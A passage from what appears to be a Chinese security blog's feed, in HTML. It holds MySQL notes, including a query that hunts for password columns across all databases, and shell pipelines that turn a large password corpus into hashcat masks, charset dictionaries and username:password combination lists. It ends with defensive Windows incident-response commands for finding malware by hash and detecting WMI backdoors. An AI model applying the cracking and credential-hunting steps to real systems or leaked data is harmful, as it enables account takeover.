class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=gbk DELAY_KEY_WRITE=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> qqinfo_1 (<span class="string">`QQNum`</span>,<span class="string">`Nick`</span>,<span class="string">`QunNum`</span>) <span class="keyword">select</span> <span class="string">`QQNum`</span>,<span class="string">`Nick`</span>,<span class="string">`QunNum`</span> <span class="keyword">from</span> qqinfo.qqinfo; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql 导库</span><br><span class="line">指定编码不易出错</span><br><span class="line"></span><br><span class="line">mysql -uroot <span class="comment">--default-character-set=utf8 net &lt; net.txt </span></span><br><span class="line"></span><br><span class="line">mysqldump -h 127.0.0.1 -uroot  -proot <span class="comment">--opt --skip-lock-tables --default-character-set=utf8  net1 members &gt;/data/www/pmxy/data/net1.txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql中所有库查找包含某个字段的表 如 password</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_schema,table_name,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema !=<span class="number">0x696E666F726D6174696F6E5F736368656D61</span> <span class="keyword">and</span> table_schema !=<span class="number">0x6D7973716C</span> <span class="keyword">and</span> table_schema !=<span class="number">0x706572666F726D616E63655F736368656D61</span> <span class="keyword">and</span> (column_name <span class="keyword">like</span> <span class="string">'%pass%'</span> <span class="keyword">or</span> column_name <span class="keyword">like</span> <span class="string">'%pwd%'</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> 比<span class="keyword">source</span>  及直接导入<span class="keyword">sql</span> 文件快无数倍！强烈建议使用</span><br></pre></td></tr></table></figure><h2 id="0x06-字符统计筛选"><a href="#0x06-字符统计筛选" class="headerlink" title="0x06 字符统计筛选"></a>0x06 字符统计筛选</h2><blockquote><p>以下内容来源t00ls.net @download</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">//整理字符集为键盘上的字符5-30位的密码</span><br><span class="line">grep -o -P <span class="string">"[[:lower:][:upper:][:digit:][:punct:] ]+"</span> 2014_1_last | awk <span class="string">'&#123;if(length($0) &gt; 4 &amp;&amp; length($0) &lt; 31) print $0&#125;'</span> &gt;&gt; 2014_1_last_</span><br><span class="line"></span><br><span class="line">//删除1-7位的纯大写、1-7位的纯小写、1-9位的纯数字</span><br><span class="line">sed <span class="string">"/^[[:upper:]]\&#123;1,7\&#125;$/d;/^[[:lower:]]\&#123;1,7\&#125;$/d;/^[[:digit:]]\&#123;1,9\&#125;$/d;"</span> 2014_1_last_ &gt;&gt;2014_1_last__</span><br><span class="line"></span><br><span class="line">//hashcat_masks 排名</span><br><span class="line">sed <span class="string">'s/[[:lower:]]/l/g;s/[[:upper:]]/u/g;s/[[:digit:]]/d/g;s/[[:punct:] ]/s/g'</span> 2014_1_last__ | sort | uniq -c | sort -nr &gt;&gt;2014_1_last__hashcat_masks_sus</span><br><span class="line"></span><br><span class="line">//hashcat_masks 将luds前边加 ?</span><br><span class="line">sed <span class="string">'s/\([luds]\)/?\0/g;'</span> 2014_1_last__hashcat_masks_sus</span><br><span class="line"> </span><br><span class="line">//密码长度排名</span><br><span class="line">1、awk <span class="string">'&#123;printf("%s %s %s\r\n",$1,length($2),$2)&#125;'</span> 2014_1_last__hashcat_masks_sus &gt;&gt;2014_1_last__hashcat_masks_sus_length</span><br><span class="line">2、awk <span class="string">'&#123;a[$2]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last_x_hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line">11 25281160</span><br><span class="line">10 15342231</span><br><span class="line">12 11047379</span><br><span class="line">14 9794974</span><br><span class="line">13 9105853</span><br><span class="line">9 8726583</span><br><span class="line">15 6864187</span><br><span class="line">8 6617661</span><br><span class="line">16 6235360</span><br><span class="line">7 1848134</span><br><span class="line">6 899233</span><br><span class="line">17 83551</span><br><span class="line">18 40174</span><br><span class="line">19 32202</span><br><span class="line">21 12649</span><br><span class="line">20 8847</span><br><span class="line">22 2216</span><br><span class="line">23 1824</span><br><span class="line">24 1333</span><br><span class="line">25 927</span><br><span class="line">28 918</span><br><span class="line">26 829</span><br><span class="line">27 733</span><br><span class="line">29 400</span><br><span class="line">30 255</span><br><span class="line">5 28</span><br><span class="line"></span><br><span class="line">//长度百分比排名</span><br><span class="line">$ awk <span class="string">'&#123;a[$2]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | awk <span class="string">'&#123;a[NR]=$1;b[NR]=$2;s+=$2&#125;END&#123;for(j=1;j&lt;NR+1;j++) printf "%s\t%.5f%\n",a[j],b[j]*100/s&#125;'</span> 2014_1_last__length_sus | sort -nr -k2</span><br><span class="line">11      24.79769%</span><br><span class="line">10      15.04883%</span><br><span class="line">12      10.83611%</span><br><span class="line">14      9.60766%</span><br><span class="line">13      8.93172%</span><br><span class="line">9       8.55970%</span><br><span class="line">15      6.73292%</span><br><span class="line">8       6.49111%</span><br><span class="line">16      6.11612%</span><br><span class="line">7       1.81279%</span><br><span class="line">6       0.88204%</span><br><span class="line">17      0.08195%</span><br><span class="line">18      0.03941%</span><br><span class="line">19      0.03159%</span><br><span class="line">21      0.01241%</span><br><span class="line">20      0.00868%</span><br><span class="line">22      0.00217%</span><br><span class="line">23      0.00179%</span><br><span class="line">24      0.00131%</span><br><span class="line">25      0.00091%</span><br><span class="line">28      0.00090%</span><br><span class="line">26      0.00081%</span><br><span class="line">27      0.00072%</span><br><span class="line">29      0.00039%</span><br><span class="line">30      0.00025%</span><br><span class="line">5       0.00003%</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">//同时包含四种字符的排序</span><br><span class="line">$ grep <span class="string">'[u]'</span> 2014_1_last_x_hashcat_masks_sus | grep <span class="string">'[d]'</span> | grep <span class="string">'[l]'</span> | grep <span class="string">'[s]'</span> | head -n 10 | nl</span><br><span class="line">     1     1074 ullsdddd</span><br><span class="line">     2      963 ulllsdddd</span><br><span class="line">     3      834 ullsdddddd</span><br><span class="line">     4      807 ulldddds</span><br><span class="line">     5      800 ullllsdddd</span><br><span class="line">     6      735 uldddddds</span><br><span class="line">     7      735 ulddddddddddds</span><br><span class="line">     8      715 ulldddddds</span><br><span class="line">     9      703 ulddddddds</span><br><span class="line">    10      687 ullldddds</span><br><span class="line"></span><br><span class="line">//同时包含大小写数字的排序</span><br><span class="line">$ grep <span class="string">'[u]'</span> 2014_1_last__hashcat_masks_sus | grep <span class="string">'[d]'</span> | grep <span class="string">'[l]'</span> | grep <span class="string">'[^s]'</span> | head -n 10 | nl</span><br><span class="line">     1    14383 ulldddddd</span><br><span class="line">     2    13679 uldddddd</span><br><span class="line">     3    11557 ulldddddddd</span><br><span class="line">     4    11054 uldddddddd</span><br><span class="line">     5    11003 ulddddddddddd</span><br><span class="line">     6    10521 ullldddd</span><br><span class="line">     7    10099 ullddddddd</span><br><span class="line">     8    10060 ullddddddddddd</span><br><span class="line">     9     9967 ulddddddd</span><br><span class="line">    10     9264 ulllldddd</span><br><span class="line"></span><br><span class="line">//同时包含大小写的排序</span><br><span class="line">$ grep <span class="string">'[u]'</span> 2014_1_last__hashcat_masks_sus | grep <span class="string">'[l]'</span> | grep <span class="string">'[^d]'</span> | grep <span class="string">'[^s]'</span> | head -n 10 | nl</span><br><span class="line">     1    14383 ulldddddd</span><br><span class="line">     2    13679 uldddddd</span><br><span class="line">     3    11557 ulldddddddd</span><br><span class="line">     4    11054 uldddddddd</span><br><span class="line">     5    11003 ulddddddddddd</span><br><span class="line">     6    10521 ullldddd</span><br><span class="line">     7    10099 ullddddddd</span><br><span class="line">     8    10060 ullddddddddddd</span><br><span class="line">     9     9967 ulddddddd</span><br><span class="line">    10     9264 ulllldddd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//连续的纯字符的排序</span><br><span class="line">$ sed -n <span class="string">'/\b\([luds]\)\1*$/p'</span> 2014_1_last__hashcat_masks_sus</span><br><span class="line">16406454 ddddddddddd</span><br><span class="line">5475964 dddddddddd</span><br><span class="line">2129702 dddddddddddd</span><br><span class="line">1189570 dddddddddddddd</span><br><span class="line"> 822811 llllllllll</span><br><span class="line"> 734170 lllllllll</span><br><span class="line"> 658042 ddddddddddddd</span><br><span class="line"> 653511 llllllll</span><br><span class="line"> 643282 lllllllllll</span><br><span class="line"> 606358 dddddddddddddddd</span><br><span class="line"> 570914 llllllllllll</span><br><span class="line"></span><br><span class="line">//统计开头的第一个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,1,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的第二个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,2,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的第三个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,3,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的前二个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,1,2)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的前三个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,1,3)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last_x_hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的前四个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,1,4)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//统计开头的最后一个字母的数量排序</span><br><span class="line">$ awk <span class="string">'&#123;a[substr($3,length($3),1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;'</span> 2014_1_last__hashcat_masks_sus_length | sort -nr -k2</span><br><span class="line"></span><br><span class="line">//提取特定字符集的字典</span><br><span class="line"></span><br><span class="line">grep -P <span class="string">"^[[:lower:]]+$"</span> 2014_1_last__ &gt;&gt;2014_1_last__lower</span><br><span class="line">grep -P <span class="string">"^[[:upper:]]+$"</span> 2014_1_last__ &gt;&gt;2014_1_last__upper</span><br><span class="line">grep -P <span class="string">"^[[:digit:]]+$"</span> 2014_1_last__ &gt;&gt;2014_1_last__digit</span><br><span class="line">grep -P <span class="string">"^[[:punct:] ]+$"</span> 2014_1_last__ &gt;&gt;2014_1_last__punct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:upper:]]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:]]+$"</span> | grep -P -v <span class="string">"^[[:upper:]]+$"</span> &gt;&gt;2014_1_last__lowerupper</span><br><span class="line">grep -P <span class="string">"^[[:upper:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> &gt;&gt;2014_1_last__upperpunct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> &gt;&gt;2014_1_last__lowerpunct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:digit:]]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:]]+$"</span> | grep -P -v <span class="string">"^[[:digit:]]+$"</span> &gt;&gt;2014_1_last__lowerdigit</span><br><span class="line">grep -P <span class="string">"^[[:upper:][:digit:]]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:digit:]]+$"</span> &gt;&gt;2014_1_last__upperdigit</span><br><span class="line">grep -P <span class="string">"^[[:digit:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> &gt;&gt;2014_1_last__digitpunct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:digit:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:]]+$"</span> | grep -P -v <span class="string">"^[[:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:digit:][:punct:] ]+$"</span>&gt;&gt;2014_1_last__lowerdigitpunct</span><br><span class="line">grep -P <span class="string">"^[[:upper:][:digit:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:digit:][:punct:] ]+$"</span>&gt;&gt;2014_1_last__upperdigitpunct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:upper:][:digit:]]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:]]+$"</span> | grep -P -v <span class="string">"^[[:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:digit:]]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:digit:]]+$"</span> &gt;&gt;2014_1_last__lowerupperdigit</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:upper:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:lower:][:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:lower:]]+$"</span>  | grep -P -v <span class="string">"^[[:upper:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:upper:]]+$"</span> &gt;&gt;2014_1_last__lowerupperpunct</span><br><span class="line">grep -P <span class="string">"^[[:lower:][:upper:][:digit:][:punct:] ]+$"</span> 2014_1_last__ | grep -P -v <span class="string">"^[[:alnum:]]+$"</span> | grep -P -v <span class="string">"^[[:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:digit:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:upper:][:digit:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:digit:][:punct:] ]+$"</span> | grep -P -v <span class="string">"^[[:lower:][:upper:][:punct:] ]+$"</span> &gt;&gt;2014_1_last__lowerupperdigitpunct</span><br><span class="line"></span><br><span class="line">//用户名和密码组合</span><br><span class="line">$ cat user.txt</span><br><span class="line">root</span><br><span class="line">manager</span><br><span class="line"></span><br><span class="line">$ cat pass.txt</span><br><span class="line">123</span><br><span class="line">456</span><br><span class="line">asd</span><br><span class="line">password</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line">$ awk <span class="string">'NR==FNR&#123;a[FNR]=$1;num=FNR&#125;NR&gt;FNR&#123;for(i=1;i&lt;=num;i++)&#123;print a[i] ":" $1&#125;&#125;'</span> user.txt pass.txt</span><br><span class="line">root:123</span><br><span class="line">manager:123</span><br><span class="line">root:456</span><br><span class="line">manager:456</span><br><span class="line">root:asd</span><br><span class="line">manager:asd</span><br><span class="line">root:password</span><br><span class="line">manager:password</span><br><span class="line">root:admin</span><br><span class="line">manager:admin</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> regx sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应笔记 windows 常用命令记录</title>
      <link href="/2019/02/12/threathunter-windows/"/>
      <url>/2019/02/12/threathunter-windows/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以下案例均为项目中遇到的，欢迎补充,文章随时更新</p></blockquote><h3 id="0x01-删除指定hash值的文件"><a href="#0x01-删除指定hash值的文件" class="headerlink" title="0x01 删除指定hash值的文件"></a>0x01 删除指定hash值的文件</h3><p>需求：<br>已知恶意文件md5值为：<code>59B18D6146A2AA066F661599C496090D</code>、<code>6FF97A7DABF09EBB07C157F286DC81AD</code> ，需要全部删除。</p><p>代码如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[array]<span class="variable">$md5</span>=<span class="built_in">Get-FileHash</span> .\*.exe -Algorithm md5</span><br><span class="line"><span class="variable">$md5</span> | Where -Property Hash <span class="nomarkup">-in</span> -Value <span class="string">"59B18D6146A2AA066F661599C496090D"</span>,<span class="string">"6FF97A7DABF09EBB07C157F286DC81AD"</span></span><br><span class="line"> | <span class="built_in">Remove-Item</span></span><br></pre></td></tr></table></figure><p><strong>例图：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/1103363282.png" alt></p><blockquote><p>ps:低版本powershell不支持，以下代码为通用获取md5函数</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-md5 &#123;</span><br><span class="line">  <span class="keyword">Param</span>(<span class="variable">$path</span>)</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="variable">$path</span> -PathType Leaf )&#123;</span><br><span class="line">  <span class="variable">$md5file</span>=certutil -hashfile <span class="variable">$path</span> MD5</span><br><span class="line">  [string]<span class="variable">$hash</span>=<span class="variable">$md5file</span> <span class="nomarkup">-match</span> <span class="string">"^[a-f0-9]&#123;32&#125;$"</span></span><br><span class="line">  <span class="variable">$retVal</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">                    PATH = <span class="variable">$path</span></span><br><span class="line">                    Hash = <span class="variable">$hash</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$retVal</span></span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">write-host</span> [-] <span class="string">'Get-md5'</span> c:\windows\system32\calc.exe -ForegroundColor Red</span><br><span class="line">  <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/3939328751.png" alt><br>cmd下获取md5:<br><code>certutil -hashfile c:\windows\system32\cmd.exe MD5 |findstr /r &quot;^[a-fA-F0-9]*$&quot;</code></p><blockquote><p>支持powershell 2.0 的get-hash<br><a href="https://gist.github.com/jaredcatkinson/7d561b553a04501238f8e4f061f112b7" target="_blank" rel="noopener">https://gist.github.com/jaredcatkinson/7d561b553a04501238f8e4f061f112b7</a></p></blockquote><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/287109341.png" alt></p><p><strong>案例：搜索系统目录下恶意文件</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-md5 &#123;</span><br><span class="line">  <span class="keyword">Param</span>(<span class="variable">$path</span>)</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="variable">$path</span> -PathType Leaf )&#123;</span><br><span class="line">  <span class="variable">$md5file</span>=certutil -hashfile <span class="string">"<span class="variable">$path</span>"</span> MD5</span><br><span class="line">  [string]<span class="variable">$hash</span>=<span class="variable">$md5file</span> <span class="nomarkup">-match</span> <span class="string">"^[a-f0-9]&#123;32&#125;$"</span></span><br><span class="line">  <span class="variable">$retVal</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">                    Path = <span class="variable">$path</span></span><br><span class="line">                    Hash = <span class="variable">$hash</span>.ToUpper()</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$retVal</span></span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[array]<span class="variable">$md5</span>=<span class="built_in">Get-ChildItem</span>  <span class="variable">$env:SystemRoot</span>  -ErrorAction <span class="number">0</span>  -Force -recurse -Filter *.exe | % &#123;Get-md5  <span class="variable">$_</span>.FullName&#125;</span><br><span class="line"><span class="variable">$md5</span>  | where &#123;(<span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"6983F7001DE10F4D19FC2D794C3EB534"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"59B18D6146A2AA066F661599C496090D"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"CCE36235A525858EB55070847296C4C8"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"9911858E9BEC100CCF6D8134915103EC"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"74E2A43B2B7C6E258B3A3FC2516C1235"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"D4E2EBCF92CF1B2E759FF7CE1F5688CA"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"FB89D40E24F5FF55228C38B2B07B2E77"</span> -or  <span class="variable">$_</span>.Hash <span class="nomarkup">-eq</span> <span class="string">"637BF46077AD083659D3B96A010F38FE"</span>)&#125; | %&#123;<span class="built_in">write-host</span> <span class="variable">$_Path</span>&#125;</span><br><span class="line">[array]<span class="variable">$md5</span>=@()</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2058851295.png" alt></p><h3 id="0x02-寻找某一日期创建的文件"><a href="#0x02-寻找某一日期创建的文件" class="headerlink" title="0x02 寻找某一日期创建的文件"></a>0x02 寻找某一日期创建的文件</h3><p>需求：得知某一日期遭攻击，想列出攻击日期内产生的文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /m *.exe /d +<span class="number">2019</span>/<span class="number">2</span>/<span class="number">12</span> /s /p c:\  /c "<span class="built_in">cmd</span> /c <span class="built_in">echo</span> @<span class="built_in">path</span> @fdate @ftime" <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure><p><strong>例图</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/280331542.png" alt></p><blockquote><p>forfiles是一个很强大的命令，windows下有非常详细的帮助，这里就不赘述用法了。</p></blockquote><h3 id="0x03-wmi无文件后门检测"><a href="#0x03-wmi无文件后门检测" class="headerlink" title="0x03 wmi无文件后门检测"></a>0x03 wmi无文件后门检测</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\default -list | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="nomarkup">-Match</span> <span class="string">"^[a-z]"</span>&#125;</span><br><span class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\subscription -class commandlineeventconsumer</span><br><span class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\subscription -class __eventfilter</span><br><span class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\subscription -class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><p>图例：<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/1023506850.png" alt><br><img 